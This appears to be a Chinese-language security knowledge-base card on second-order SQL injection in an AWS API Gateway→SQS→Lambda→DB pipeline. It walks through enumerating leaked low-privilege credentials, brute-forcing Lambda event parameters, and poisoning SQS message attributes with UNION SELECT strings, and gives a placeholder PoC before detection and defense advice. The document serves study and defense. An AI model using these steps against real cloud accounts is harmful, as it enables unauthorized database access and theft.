---
id: cloud-serverless-sqs-lambda-second-order-sqli
title: SQS 消息属性注入 → Lambda 消费拼 SQL 的二次注入（含 event 参数枚举与 CLI v2 payload 编码）
type: scenario
domain: cloud
path: cloud/serverless
technique: sqs-lambda-second-order-sql-injection
tags:
- cloud
- aws
- sqs
- lambda
- serverless
- sqli
- second-order-injection
- event-parameter
- aws-cli
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-11
  verified_at: '2026-11-08T07:08:37+08:00'
  notes: 已对照原文核对：aws-enumerator 权限(SQS 1/1、LAMBDA 1/4、STS 2/2)、lambda list-functions、InvokeFunction 可用/GetFunction 拒绝、CLI v2 Invalid base64 与 raw-in-base64-out、字典爆破命中 DESC 及 Invalid trackingID、SQS 消息属性格式，均与 54-61 图一致；DB error 与 union 爆表/字段/数据证据在正文文字与未落本地的外链图，本地 61 图不含该步，属未验证点；注入点为消息属性+异步 Lambda 消费，与库内 web/generic 二次注入卡不同链。
url: /docs/cloud/serverless/cloud-serverless-sqs-lambda-second-order-sqli/
draft: false
kb_aliases:
- SQS 消息队列二次注入
- Lambda 事件注入
- --cli-binary-format raw-in-base64-out
- DESC 参数枚举
- trackingID
- union select 爆库
- API网关-SQS-Lambda-DB
---

## 一句话结论

当一组泄露的低权 AWS 凭据只被允许 `sqs:ListQueues/SendMessage/ReceiveMessage` 与 `lambda:ListFunctions/Invoke` 时，可往 SQS 队列投毒消息属性（如 `Client` 字段含引号/注入串），再由消费该队列的 Lambda 把属性值字符串拼接进 SQL 查询；由于注入发生在「消息入队」而非「HTTP 请求」时刻，属于**二次注入**——通过反复 `lambda invoke` 触发消费并观察 `DB error`/回显，即可用 union 查询爆出表与数据。

## 原理

- 目标架构是典型的 `API网关 → SQS → Lambda → DB`：生产者把 `Client`、`Weight`、`trackingID` 等作为消息属性写入队列，消费者 Lambda 读取消息后用类似 `select * from TrackingData where clientName = "{}".format(clientName)` 拼接 SQL。拼接点没有参数化，因此属性值里的 `"` / union 片段会在消费时进入查询。
- 注入不是立即触发，而是「先存后取」：恶意串先随 `sqs send-message` 进入队列，等 Lambda 被 `invoke` 拉取消息并查库时才执行，故称二次注入；这绕过了只检查入站 HTTP 参数的常规防护。
- 权限侦察：配好 AK/SK 后用 `aws-enumerator enum -services all` / `dump -services SQS,LAMBDA,STS` 得到可用动作（SQS `ListQueues`、LAMBDA `ListFunctions`、STS `GetCallerIdentity/GetSessionToken`）；`aws lambda list-functions` 拿到函数名 `huge-logistics-stock`。`lambda:GetFunction`（读源码）通常被拒，但 `lambda:InvokeFunction` 可用，返回 `{"body":"\"Invalid event parameter!\""}` 说明函数存在且需特定 event 字段。
- AWS CLI v2 对 `--payload` 默认要求 base64，直接传 JSON 会 `Invalid base64`；需加 `--cli-binary-format raw-in-base64-out` 让 CLI 自动编码。
- 未知 event 字段名可用字典爆破：遍历参数名字典（如 burp-parameter-names.txt）逐个 `--payload "{\"<word>\":\"test\"}"` invoke，若返回不再是 `Invalid event parameter!` 即命中（本文命中 `DESC`，随后提示需要 `trackingID`）。
- `aws sqs receive-message --message-attribute-names All` 可读到队列已有消息的属性格式（`Client`/`Weight`/`trackingID`，如 `HLT4180`）；照格式 `send-message` 投毒 `Client`（先插入单个 `"` 触发 `DB error` 验证注入），再用脚本循环 `union select 1,2,3,4; -- a` 爆列数/表名/字段/数据。

## 触发条件

- 持有可 `sqs:SendMessage/ReceiveMessage/ListQueues` 与 `lambda:InvokeFunction/ListFunctions` 的 AK/SK（泄露的硬编码凭据）。
- 目标 Lambda 消费 SQS 消息并把消息属性**字符串拼接**进 SQL，且无参数化/输入校验。
- 能确定 Lambda 期望的 event 参数名（枚举或逆向）与队列消息属性格式。

## 利用步骤

1. `aws configure` 配 AK/SK 与 region；`aws-enumerator enum -services all` 确认服务/权限。
2. `aws lambda list-functions` 找函数；`aws lambda invoke --function-name <fn> output` 看基线返回（Invalid event parameter!）。
3. 解决 CLI v2 payload 编码：加 `--cli-binary-format raw-in-base64-out`。
4. 用参数名字典循环 invoke 爆破 event 参数名，命中不再报 `Invalid event parameter!` 的字段（如 `DESC`）。
5. `aws sqs list-queues` → `receive-message --message-attribute-names All` 读出消息属性结构与合法 `trackingID`。
6. 按格式 `sqs send-message` 投毒：先在 `Client` 插入 `"` 触发 `DB error` 验证注入点。
7. 写循环脚本：`send-message` 注入 `Client` 的 union 片段 → `lambda invoke --payload '{"DESC":"<trackingID>"}'` 触发消费 → 读回显；逐步 `union select 1,2,3,4`、`查表名`、`查字段`、`查数据`。

## PoC

```text
# 基线 + CLI v2 编码
aws lambda invoke --function-name <fn> output                 # "Invalid event parameter!"
aws lambda invoke --cli-binary-format raw-in-base64-out --function-name <fn> --payload '{"one":"test"}' output
# 参数名枚举（伪代码）
for w in $(cat burp-parameter-names.txt); do aws lambda invoke ... --payload "{\"$w\":\"test\"}" output; \
  grep -q "Invalid event parameter" output || { echo "Found: $w"; break; }; done   # -> DESC
# 读队列消息格式
aws sqs receive-message --queue-url <url> --message-attribute-names All
# 投毒 + 触发（伪代码，占位串）
aws sqs send-message --queue-url <url> --message-attributes '{"Client":{"StringValue":"X\" UNION SELECT 1,2,3,4; -- ","DataType":"String"},"trackingID":{"StringValue":"<id>","DataType":"String"},...}' --message-body "Testing"
aws lambda invoke --cli-binary-format raw-in-base64-out --function-name <fn> --payload '{"DESC":"<id>"}' output && cat output
```

（最小化示意，队列 URL/trackingID/注入串为占位，未执行任何 PoC；注入串仅示意结构。）

## 变体与关联

- 变体：若 `lambda:GetFunction` 可用可直接读源码定位 SQL 拼接；若队列已有合法 `trackingID`，可直接复用而不必自己造消息；AWS CLI v1 无 base64 问题。
- 关联：与库内 `web/generic/sqli` 下大量 ORDER BY / 报错 / 时间盲注卡互补——本卡特殊在「注入点是消息队列属性、执行者是异步 Lambda、属于二次注入」，而非同步 HTTP 参数。
- 关联：前置是「云凭据泄露后服务/权限枚举」（aws-enumerator、IAM 策略自查等，本批/库内另有对应卡）；`cloud/serverless` 的事件注入视角。
- 边界：危害是读取数据库数据（及可能的进一步利用），不含对 AWS 账号本身的提权。

## 检测与防御

- 检测：CloudTrail 监控异常 `lambda:InvokeFunction` 高频调用、`sqs:SendMessage` 中出现引号/UNION/注释等特征、Lambda 日志里的 `DB error` 与异常 SQL；SQS 消息属性做内容校验。
- 防御：Lambda 侧对消息属性做严格类型/白名单校验并使用**参数化查询**（杜绝字符串拼接）；最小权限收紧 `SendMessage`/`InvokeFunction`；对 SQS 消息来源做签名/校验；开启 RDS 查询日志与 WAF 规则覆盖二次注入。
